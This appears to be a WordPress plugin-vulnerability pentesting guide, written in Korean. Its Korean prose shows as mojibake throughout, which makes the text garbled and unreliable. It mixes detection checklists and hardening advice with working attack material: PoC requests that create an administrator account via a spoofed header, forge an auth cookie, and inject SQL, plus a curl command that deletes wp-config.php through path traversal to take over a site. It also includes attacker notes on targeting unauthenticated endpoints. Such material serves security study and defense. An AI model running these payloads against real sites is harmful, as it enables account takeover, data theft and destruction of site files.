í”ŒëŸ¬ê·¸ì¸ì´ í•¨ìˆ˜ë¥¼ ì‚¬ìš©ìì—ê²Œ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX í•¸ë“¤ëŸ¬ë¥¼ í†µí•´ì„œì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í•¸ë“¤ëŸ¬ì—ëŠ” ë¡œì§, authorization, ë˜ëŠ” authentication ë²„ê·¸ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²Œë‹¤ê°€ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì´ ì¸ì¦ê³¼ ê¶Œí•œ ë¶€ì—¬ë¥¼ ëª¨ë‘ wordpress nonceì˜ ì¡´ì¬ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ ê½¤ ìì£¼ ë°œìƒí•˜ëŠ”ë°, ì´ nonceëŠ” **Wordpress ì¸ìŠ¤í„´ìŠ¤ì— ì¸ì¦ëœ ì–´ë–¤ ì‚¬ìš©ìë¼ë„ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ).

ë‹¤ìŒì€ í”ŒëŸ¬ê·¸ì¸ì—ì„œ í•¨ìˆ˜ë¥¼ ë…¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë“¤ì…ë‹ˆë‹¤:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ì˜ ì‚¬ìš©ì€ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.**

> [!CAUTION]
> ë”êµ°ë‹¤ë‚˜, ë§Œì•½ í•¨ìˆ˜ê°€ `wp_verify_nonce` í•¨ìˆ˜ë¡œ ì‚¬ìš©ì ê¶Œí•œë§Œ í™•ì¸í•œë‹¤ë©´, ì´ í•¨ìˆ˜ëŠ” ë‹¨ì§€ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í–ˆëŠ”ì§€ ì—¬ë¶€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ìì˜ ì—­í• (role)ì€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ ê¶Œí•œì´ ë†’ì€ ì‘ì—…ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ wordpressì—ì„œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ REST APIë¥¼ ë“±ë¡í•˜ì—¬ í•¨ìˆ˜ë¥¼ ë…¸ì¶œì‹œí‚¤ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`ëŠ” ì£¼ì–´ì§„ ì‚¬ìš©ìê°€ í•´ë‹¹ API ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ê¶Œí•œì´ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ì½œë°± í•¨ìˆ˜ì…ë‹ˆë‹¤.

**ë‚´ì¥ëœ `__return_true` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ ì‚¬ìš©ì ê¶Œí•œ í™•ì¸ì„ ê±´ë„ˆëœë‹ˆë‹¤.**

- **ì§ì ‘ì ì¸ php íŒŒì¼ ì ‘ê·¼**

ë¬¼ë¡ , WordpressëŠ” phpë¥¼ ì‚¬ìš©í•˜ë©° í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ê³  ìˆë‹¤ë©´ ëª¨ë“  ì‚¬ìš©ìê°€ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ë‚´ë¶€ í†µí•©ì´ë‚˜ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œìš©ìœ¼ë¡œ â€œtrusted headerâ€ ë‹¨ì¶•ì„ êµ¬í˜„í•˜ê³ , ê·¸ í—¤ë”ë¥¼ ì‚¬ìš©í•´ REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. í•´ë‹¹ í—¤ë”ê°€ ìƒìœ„ êµ¬ì„±ìš”ì†Œì— ì˜í•´ ì•”í˜¸í•™ì ìœ¼ë¡œ ìš”ì²­ì— ë°”ì¸ë”©ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´ ê³µê²©ìê°€ ì´ë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ administrator ê¶Œí•œìœ¼ë¡œ ì œí•œëœ REST ê²½ë¡œì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- Impact: core users REST ê²½ë¡œë¥¼ í†µí•´ ìƒˆë¡œìš´ administratorë¥¼ ìƒì„±í•˜ì—¬ ì¸ì¦ ì—†ì´ admin ê¶Œí•œìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (ì‚¬ìš©ì ID 1ì„ ê°•ì œ, ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ administrator ê³„ì •).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- í”ŒëŸ¬ê·¸ì¸ì´ í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœì— ëŒ€ì‘ì‹œí‚¤ê³  ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆëœë‹ˆë‹¤.
- WordPress ì½”ì–´ëŠ” ì´ ë¼ìš°íŠ¸ì— ëŒ€í•´ `create_users` ê¶Œí•œì„ ìš”êµ¬í•©ë‹ˆë‹¤; í”ŒëŸ¬ê·¸ì¸ í•´í‚¹ì€ í—¤ë”ì—ì„œ ì§ì ‘ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•´ ì´ë¥¼ ìš°íšŒí•©ë‹ˆë‹¤.

Expected success indicators

- ìƒì„±ëœ ì‚¬ìš©ìë¥¼ ì„¤ëª…í•˜ëŠ” JSON ë³¸ë¬¸ê³¼ í•¨ê»˜ HTTP 201.
- `wp-admin/users.php`ì—ì„œ ë³´ì´ëŠ” ìƒˆë¡œìš´ ê´€ë¦¬ì ê³„ì •.

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']`, ë˜ëŠ” ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ ì»¤ìŠ¤í…€ í—¤ë”ë¥¼ ì½ëŠ” vendor SDKsë¥¼ grepí•©ë‹ˆë‹¤ (ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- request headersì— ì˜ì¡´í•˜ê³  ê°•ë ¥í•œ `permission_callback` ê²€ì‚¬ê°€ ì—†ëŠ” ê¶Œí•œì´ ìˆëŠ” ì½œë°±ì— ëŒ€í•œ REST ë“±ë¡ì„ ê²€í† í•©ë‹ˆë‹¤.
- í—¤ë” ê°’ë§Œìœ¼ë¡œ ê²Œì´íŠ¸ëœ REST í•¸ë“¤ëŸ¬ ë‚´ë¶€ì—ì„œ í•µì‹¬ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜ë“¤(`wp_insert_user`, `wp_create_user`)ì˜ ì‚¬ìš©ì„ ì°¾ìŠµë‹ˆë‹¤.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ ìì£¼ `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë  ë•Œ **ì½œë°±ì€ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìì— ì˜í•´ ì ‘ê·¼ ê°€ëŠ¥í•´ì§€ë¯€ë¡œ**, ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤:

1. **ê¶Œí•œ ê²€ì‚¬** (ì˜ˆ: `current_user_can()` ë˜ëŠ” ì ì–´ë„ `is_user_logged_in()`), ë°
2. `check_ajax_referer()` / `wp_verify_nonce()`ë¡œ ê²€ì¦ëœ **CSRF nonce**, ë°
3. ì…ë ¥ê°’ì— ëŒ€í•œ ì—„ê²©í•œ ì •ì œ/ê²€ì¦.

Litho multipurpose theme (< 3.1)ëŠ” *Remove Font Family* ê¸°ëŠ¥ì—ì„œ ì´ 3ê°€ì§€ ì œì–´ë¥¼ ëˆ„ë½í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ(ë‹¨ìˆœí™”ë¨)ë¥¼ ë°°í¬í–ˆìŠµë‹ˆë‹¤:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•œ ë¬¸ì œ:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ ëª¨ë“  ë°©ë¬¸ìê°€ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **No path sanitisation** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ì‹œìŠ¤í…œ ê²½ë¡œì— ì—°ê²°ë˜ì–´ í´ë˜ì‹ `../../` ê²½ë¡œ ì´íƒˆì„ í—ˆìš©í•©ë‹ˆë‹¤.

#### Exploitation

ê³µê²©ìëŠ” ë‹¨ì¼ HTTP POST ìš”ì²­ì„ ì „ì†¡í•¨ìœ¼ë¡œì¨ **uploads ê¸°ë³¸ ë””ë ‰í„°ë¦¬ ì•„ë˜** (ë³´í†µ `<wp-root>/wp-content/uploads/`)ì˜ ì–´ë–¤ íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬ë“  ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

ë‹¤ë¥¸ ì˜í–¥ë ¥ ìˆëŠ” ëŒ€ìƒì—ëŠ” í”ŒëŸ¬ê·¸ì¸/í…Œë§ˆì˜ `.php` íŒŒì¼(ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸ì„ ë¬´ë ¥í™”í•˜ê¸° ìœ„í•´) ë˜ëŠ” `.htaccess` ê·œì¹™ì´ ìˆë‹¤.

#### ê°ì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### ì˜¤ë˜ëœ ì—­í•  ë³µì›ê³¼ ê¶Œí•œ ê²€ì‚¬ ëˆ„ë½ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ (ASE "View Admin as Role")

ë§ì€ í”ŒëŸ¬ê·¸ì¸ì´ ì›ë˜ ì—­í• ì„ user metaì— ì €ì¥í•´ ë‚˜ì¤‘ì— ë³µì›í•  ìˆ˜ ìˆê²Œ "view as role" ë˜ëŠ” ì„ì‹œ ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ êµ¬í˜„í•œë‹¤. ë³µì› ê²½ë¡œê°€ capabilities í™•ì¸ê³¼ ìœ íš¨í•œ nonce ì—†ì´ ìš”ì²­ ë³€ìˆ˜(ì˜ˆ: `$_REQUEST['reset-for']`)ì™€ í”ŒëŸ¬ê·¸ì¸ì´ ê´€ë¦¬í•˜ëŠ” ëª©ë¡ì—ë§Œ ì˜ì¡´í•œë‹¤ë©´, ì´ëŠ” ìˆ˜ì§ ê¶Œí•œ ìƒìŠ¹(vertical privilege escalation)ì´ ëœë‹¤.

ì‹¤ì œ ì‚¬ë¡€ë¡œ Admin and Site Enhancements (ASE) í”ŒëŸ¬ê·¸ì¸ (â‰¤ 7.6.2.1)ì—ì„œ ë°œê²¬ëë‹¤. reset ë¶„ê¸°(branch)ëŠ” ë‚´ë¶€ ë°°ì—´ `$options['viewing_admin_as_role_are']`ì— ì‚¬ìš©ìê°€ ì¡´ì¬í•˜ë©´ `reset-for=<username>`ì— ë”°ë¼ ì—­í• ì„ ë³µì›í–ˆì§€ë§Œ, í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  user meta `_asenha_view_admin_as_original_roles`ì—ì„œ ì €ì¥ëœ ì—­í• ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ê¸° ì „ì— `current_user_can()` ì²´í¬ë‚˜ nonce ê²€ì¦ì„ ì „í˜€ ìˆ˜í–‰í•˜ì§€ ì•Šì•˜ë‹¤:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why itâ€™s exploitable

- ì„œë²„ ì¸¡ ê¶Œí•œ í™•ì¸ ì—†ì´ `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ ì‹ ë¢°í•œë‹¤.
- ì‚¬ìš©ìê°€ ì´ì „ì— `_asenha_view_admin_as_original_roles`ì— ë†’ì€ ê¶Œí•œì´ ì €ì¥ë˜ì–´ ìˆë‹¤ê°€ ê¶Œí•œì´ ê°•ë“±ëœ ê²½ìš°, reset ê²½ë¡œë¥¼ í˜¸ì¶œí•´ ê·¸ ê¶Œí•œì„ ë³µì›í•  ìˆ˜ ìˆë‹¤.
- ì¼ë¶€ ë°°í¬ í™˜ê²½ì—ì„œëŠ” ì¸ì¦ëœ ì‚¬ìš©ìë¼ë©´ ëˆ„êµ¬ë‚˜ `viewing_admin_as_role_are`ì— ì—¬ì „íˆ ë‚¨ì•„ ìˆëŠ” ë‹¤ë¥¸ ì‚¬ìš©ì ì´ë¦„ì— ëŒ€í•´ resetì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆë‹¤(ê¶Œí•œ ê²€ì¦ ê²°í•¨).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ì·¨ì•½í•œ ë¹Œë“œì—ì„œëŠ” ì´ê²ƒì´ í˜„ì¬ ì—­í• ì„ ì œê±°í•˜ê³  ì €ì¥ëœ ì›ë˜ ì—­í• (ì˜ˆ: `administrator`)ì„ ë‹¤ì‹œ ì¶”ê°€í•˜ì—¬ ì‹¤ì§ˆì ìœ¼ë¡œ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚µë‹ˆë‹¤.

Detection checklist

- user metaì— â€œoriginal rolesâ€ë¥¼ ìœ ì§€í•˜ëŠ” ì—­í•  ì „í™˜ ê¸°ëŠ¥(ì˜ˆ: `_asenha_view_admin_as_original_roles`)ì„ ì°¾ìœ¼ì„¸ìš”.
- ë‹¤ìŒê³¼ ê°™ì€ ë¦¬ì…‹/ë³µì› ê²½ë¡œë¥¼ ì‹ë³„í•˜ì„¸ìš”:
  - ì‚¬ìš©ìëª…ì„ `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì½ìŒ.
  - `current_user_can()` ë° `wp_verify_nonce()` / `check_admin_referer()` ì—†ì´ `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ë³€ê²½í•¨.
  - í–‰ìœ„ìì˜ ê¶Œí•œ ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì— ê¸°ë°˜í•´ ê¶Œí•œì„ ë¶€ì—¬í•¨.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ ì‚¬ìš©ì ì „í™˜ í—¬í¼ë¥¼ ê³µê°œ `init` í›…ì— ì—°ê²°í•˜ê³  í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” ì¿ í‚¤ì—ì„œ ì‹ ì›ì„ ìœ ë„í•©ë‹ˆë‹¤. ì½”ë“œê°€ ì¸ì¦, ê¶Œí•œ ë° ìœ íš¨í•œ nonceë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  `wp_set_auth_cookie()`ë¥¼ í˜¸ì¶œí•˜ë©´, ë¹„ì¸ì¦ ë°©ë¬¸ìë„ ì„ì˜ì˜ ì‚¬ìš©ì IDë¡œ ê°•ì œ ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ì·¨ì•½í•œ ì´ìœ 

- ê³µê°œëœ `init` í›…ì€ í•¸ë“¤ëŸ¬ê°€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë„ ì ‘ê·¼ ê°€ëŠ¥í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤(`is_user_logged_in()` ê²€ì‚¬ ì—†ìŒ).
- ì‹ë³„ì€ í´ë¼ì´ì–¸íŠ¸ì—ì„œ ìˆ˜ì • ê°€ëŠ¥í•œ ì¿ í‚¤(`original_user_id`)ë¡œë¶€í„° íŒŒìƒë©ë‹ˆë‹¤.
- ì§ì ‘ì ì¸ `wp_set_auth_cookie($uid)` í˜¸ì¶œì€ ìš”ì²­ìë¥¼ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ì‹œí‚¤ë©° ê¶Œí•œ(capability)/nonce ê²€ì‚¬ ì—†ì´ ì‹¤í–‰ë©ë‹ˆë‹¤.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF ê³ ë ¤ì‚¬í•­ â€” WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

ê³µê²©ì ë…¸íŠ¸

- í”ŒëŸ¬ê·¸ì¸ë³„ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ê¹¨ë—í•œ í˜ì´ë¡œë“œë¡œ íƒ€ê¹ƒí•˜ì„¸ìš”: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, ì‚¬ìš©ì ì •ì˜ íŒŒì¼ í•¸ë“¤ëŸ¬, shortcodes.
- ìš°ì„  unauth ê²½ë¡œë¥¼ ë¨¼ì € í…ŒìŠ¤íŠ¸í•˜ì„¸ìš” (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). ê¸°ë³¸ í˜ì´ë¡œë“œëŠ” ì¢…ì¢… ë‚œë…í™” ì—†ì´ë„ ì„±ê³µí•©ë‹ˆë‹¤.
- ì „í˜•ì ì¸ ë†’ì€ ì˜í–¥ ì‚¬ë¡€: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

ë°©ì–´ ë…¸íŠ¸

- ì¼ë°˜ì ì¸ WAF ì‹œê·¸ë‹ˆì²˜ë§Œìœ¼ë¡œ plugin CVEsë¥¼ ë³´í˜¸í•˜ì§€ ë§ˆì„¸ìš”. ì• í”Œë¦¬ì¼€ì´ì…˜ ë ˆì´ì–´ ìˆ˜ì¤€ì˜ ì·¨ì•½ì ë³„ ê°€ìƒ íŒ¨ì¹˜ë¥¼ êµ¬í˜„í•˜ê±°ë‚˜ ì‹ ì†íˆ ì—…ë°ì´íŠ¸í•˜ì„¸ìš”.
- ì½”ë“œì—ì„œëŠ” negative regex í•„í„°ë³´ë‹¤ positive-security ì²´í¬(ì˜ˆ: capabilities, nonces, ì—„ê²©í•œ ì…ë ¥ ê²€ì¦)ë¥¼ ìš°ì„  ì ìš©í•˜ì„¸ìš”.

## WordPress ë³´í˜¸

### ì •ê¸° ì—…ë°ì´íŠ¸

WordPress, plugins, and themesê°€ ìµœì‹  ìƒíƒœì¸ì§€ í™•ì¸í•˜ì„¸ìš”. ë˜í•œ wp-config.phpì—ì„œ ìë™ ì—…ë°ì´íŠ¸ê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ë˜í•œ, **ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë§Œ ì„¤ì¹˜í•˜ì„¸ìš”**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ ì‚¬í•­**

- ê¸°ë³¸ **admin** ì‚¬ìš©ì ì œê±°
- ê°•ë ¥í•œ **ë¹„ë°€ë²ˆí˜¸**ì™€ **2FA** ì‚¬ìš©
- ì£¼ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **í•˜ì„¸ìš”
- Brute Force ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ** ì ìš©
- **`wp-admin.php`** íŒŒì¼ ì´ë¦„ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ì—ì„œë§Œ ë˜ëŠ” íŠ¹ì • IP ì£¼ì†Œì—ì„œë§Œ ì ‘ê·¼ì„ í—ˆìš©í•˜ì„¸ìš”.


### ì¸ì¦ë˜ì§€ ì•Šì€ SQL Injection â€” ë¶€ì ì ˆí•œ ê²€ì¦ìœ¼ë¡œ ì¸í•´ (WP Job Portal <= 2.3.2)

WP Job Portal recruitment pluginì€ **savecategory** ì‘ì—…ì„ ë…¸ì¶œì‹œì¼°ê³ , ì´ëŠ” ê²°êµ­ ë‹¤ìŒì˜ ì·¨ì•½í•œ ì½”ë“œë¥¼ `modules/category/model.php::validateFormData()` ë‚´ë¶€ì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
ì´ ìŠ¤ë‹ˆí«ì´ ìœ ë°œí•˜ëŠ” ë¬¸ì œ:

1. **Unsanitised user input** â€“ `parentid`ê°€ HTTP ìš”ì²­ì—ì„œ ê·¸ëŒ€ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
2. **String concatenation inside the WHERE clause** â€“ `is_numeric()` / `esc_sql()` / prepared statement ì—†ìŒ.
3. **Unauthenticated reachability** â€“ í•´ë‹¹ ì•¡ì…˜ì€ `admin-post.php`ë¥¼ í†µí•´ ì‹¤í–‰ë˜ì§€ë§Œ, ìœ ì¼í•œ ê²€ì¦ì€ **CSRF nonce** (`wp_verify_nonce()` )ë¿ì´ë©°, ì´ nonceëŠ” shortcode `[wpjobportal_my_resumes]`ë¥¼ í¬í•¨í•œ ê³µìš© í˜ì´ì§€ì—ì„œ ëˆ„êµ¬ë‚˜ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ì•…ìš©

1. ìƒˆë¡œìš´ nonce íšë“:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ SQLì„ ì£¼ì…:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ì‘ë‹µì€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³€ê²½í•˜ì—¬ SQLiê°€ ì¡´ì¬í•¨ì„ ì…ì¦í•©ë‹ˆë‹¤.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

ë‹¤ë¥¸ ì‘ì—…ì¸ **downloadcustomfile**ëŠ” ë°©ë¬¸ìê°€ Path Traversalì„ ì´ìš©í•´ ë””ìŠ¤í¬ìƒì˜ **ëª¨ë“  íŒŒì¼**ì„ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆê²Œ í—ˆìš©í–ˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ sinkëŠ” `modules/customfield/model.php::downloadCustomUploadedFile()`ì— ìœ„ì¹˜í•©ë‹ˆë‹¤:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
